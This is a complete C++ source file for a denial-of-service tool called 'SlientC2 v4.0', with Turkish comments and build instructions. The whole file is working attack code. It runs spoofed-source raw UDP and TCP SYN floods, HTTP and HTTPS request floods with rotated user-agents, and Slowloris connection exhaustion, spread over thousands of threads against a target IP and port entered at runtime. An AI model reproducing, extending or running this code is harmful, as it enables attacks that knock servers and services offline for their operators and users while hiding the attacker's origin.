// SlientC2 v4.0 - C++ ULTIMATE DDoS
// Compile: g++ -std=c++11 -pthread -O3 -o slientc2 slientc2.cpp
// Run: ./slientc2

#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <curl/curl.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

using namespace std;

// ===== RENKLER =====
#define KIRMIZI "\033[91m"
#define YESIL "\033[92m"
#define SARI "\033[93m"
#define MAVI "\033[94m"
#define MOR "\033[95m"
#define CYAN "\033[96m"
#define BEYAZ "\033[97m"
#define SIFIRLA "\033[0m"
#define BOLD "\033[1m"

// ===== GLOBAL DEĞİŞKENLER =====
atomic<long long> paket_sayisi(0);
atomic<long long> bayt_sayisi(0);
atomic<bool> calisiyor(true);
string hedef_ip;
int hedef_port;
int thread_sayisi = 5000;
time_t baslangic;

// ===== USER-AGENT LIST =====
vector<string> ua_list = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) Chrome/120.0.0.0 Mobile"
};

// ===== FAKE IP LIST =====
vector<string> fake_ips = {
    "10.0.0.1", "172.16.0.1", "192.168.1.1",
    "10.10.10.10", "172.20.0.1", "192.168.100.100"
};

// ===== IP CHECKSUM =====
unsigned short checksum(void *b, int len) {
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// ===== UDP FLOOD (RAW SOCKET) =====
void udp_flood_raw() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) return;
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(hedef_port);
    sin.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
    
    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    
    while (calisiyor) {
        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1460;
        iph->id = htonl(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = inet_addr(fake_ips[rand() % fake_ips.size()].c_str());
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr));
        
        // UDP Header
        udph->source = htons(rand() % 65535);
        udph->dest = htons(hedef_port);
        udph->len = htons(sizeof(struct udphdr) + 1460);
        udph->check = 0;
        
        // Payload
        char *data = (char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
        for (int i = 0; i < 1460; i++)
            data[i] = rand() % 256;
        
        // Send
        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            paket_sayisi++;
            bayt_sayisi += iph->tot_len;
        }
    }
    close(sock);
}

// ===== TCP SYN FLOOD =====
void tcp_syn_flood() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) return;
    
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(hedef_port);
    sin.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
    
    char packet[4096];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    while (calisiyor) {
        // IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htonl(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = inet_addr(fake_ips[rand() % fake_ips.size()].c_str());
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr));
        
        // TCP Header
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(hedef_port);
        tcph->seq = htonl(rand() % 0xFFFFFFFF);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(5840);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        // Send
        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            paket_sayisi++;
            bayt_sayisi += iph->tot_len;
        }
    }
    close(sock);
}

// ===== HTTP FLOOD (CURL) =====
void http_flood() {
    CURL *curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        string url = "http://" + hedef_ip + ":" + to_string(hedef_port) + "/";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 1L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 1L);
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, ua_list[rand() % ua_list.size()].c_str());
        
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Accept: text/html,*/*");
        headers = curl_slist_append(headers, "Connection: keep-alive");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        
        while (calisiyor) {
            res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                paket_sayisi++;
                bayt_sayisi += 1024;
            }
        }
        
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

// ===== SSL/HTTPS FLOOD =====
void https_flood() {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
    
    while (calisiyor) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(hedef_port);
        addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        SSL_CTX *ctx = SSL_CTX_new(SSLv23_client_method());
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        SSL_connect(ssl);
        
        string request = "GET / HTTP/1.1\r\n";
        request += "Host: " + hedef_ip + ":" + to_string(hedef_port) + "\r\n";
        request += "User-Agent: " + ua_list[rand() % ua_list.size()] + "\r\n";
        request += "Accept: text/html,*/*\r\n";
        request += "Connection: keep-alive\r\n\r\n";
        
        SSL_write(ssl, request.c_str(), request.length());
        
        paket_sayisi++;
        bayt_sayisi += request.length();
        
        SSL_shutdown(ssl);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        close(sock);
    }
}

// ===== SLOWLORIS =====
void slowloris() {
    while (calisiyor) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(hedef_port);
        addr.sin_addr.s_addr = inet_addr(hedef_ip.c_str());
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        string initial = "GET / HTTP/1.1\r\n";
        initial += "Host: " + hedef_ip + "\r\n";
        initial += "User-Agent: " + ua_list[rand() % ua_list.size()] + "\r\n";
        initial += "Accept: text/html,*/*\r\n";
        
        send(sock, initial.c_str(), initial.length(), 0);
        
        // Keep alive
        for (int i = 0; i < 30 && calisiyor; i++) {
            string header = "X-a: " + to_string(rand() % 1000000) + "\r\n";
            send(sock, header.c_str(), header.length(), 0);
            this_thread::sleep_for(chrono::milliseconds(500));
        }
        
        close(sock);
    }
}

// ===== İSTATİSTİK =====
void istatistik_goster() {
    while (calisiyor) {
        time_t simdi = time(NULL);
        double gecen = difftime(simdi, baslangic);
        double mb = bayt_sayisi / (1024.0 * 1024.0);
        double mbps = (bayt_sayisi * 8.0) / (gecen * 1000000.0);
        
        system("clear");
        cout << CYAN << R"(
╔══════════════════════════════════════════════════════╗
║              SlientC2 v4.0 C++ ULTIMATE             ║
╠══════════════════════════════════════════════════════╣
║  Target: )" << hedef_ip << ":" << hedef_port << "                   \n";
        cout << "║  Packets: " << paket_sayisi.load() << "                              \n";
        cout << "║  Data: " << fixed << mb << " MB (" << mbps << " Mbps)          \n";
        cout << "║  Threads: " << thread_sayisi << "                                \n";
        cout << "║  Time: " << (int)gecen << "s                                    \n";
        cout << "╚══════════════════════════════════════════════════════╝" << SIFIRLA << endl;
        
        this_thread::sleep_for(chrono::seconds(1));
    }
}

// ===== ANA FONKSİYON =====
int main() {
    system("clear");
    
    cout << CYAN << R"(
╔══════════════════════════════════════════════════════╗
║              SlientC2 v4.0 C++ ULTIMATE             ║
║                                                    ║
║          10x Faster Than Python Version            ║
║          RAW Socket + SSL + Slowloris              ║
╚══════════════════════════════════════════════════════╝
)" << SIFIRLA << endl;
    
    // Hedef bilgileri
    cout << YESIL << "Target IP: " << SIFIRLA;
    cin >> hedef_ip;
    cout << YESIL << "Port: " << SIFIRLA;
    cin >> hedef_port;
    cout << YESIL << "Threads (1000-10000): " << SIFIRLA;
    cin >> thread_sayisi;
    
    if (thread_sayisi < 1000) thread_sayisi = 1000;
    if (thread_sayisi > 10000) thread_sayisi = 10000;
    
    // Root kontrolü
    if (getuid() != 0) {
        cout << KIRMIZI << "[!] Root required for RAW sockets!" << SIFIRLA << endl;
        return 1;
    }
    
    // Başlangıç
    baslangic = time(NULL);
    
    // İstatistik thread'i
    thread stats_thread(istatistik_goster);
    stats_thread.detach();
    
    // Thread havuzu
    vector<thread> threads;
    
    for (int i = 0; i < thread_sayisi; i++) {
        int mod = i % 5;
        
        if (mod == 0)
            threads.push_back(thread(udp_flood_raw));
        else if (mod == 1)
            threads.push_back(thread(tcp_syn_flood));
        else if (mod == 2)
            threads.push_back(thread(http_flood));
        else if (mod == 3)
            threads.push_back(thread(https_flood));
        else
            threads.push_back(thread(slowloris));
    }
    
    // Thread'leri bekle
    for (auto &t : threads) {
        t.join();
    }
    
    return 0;
}
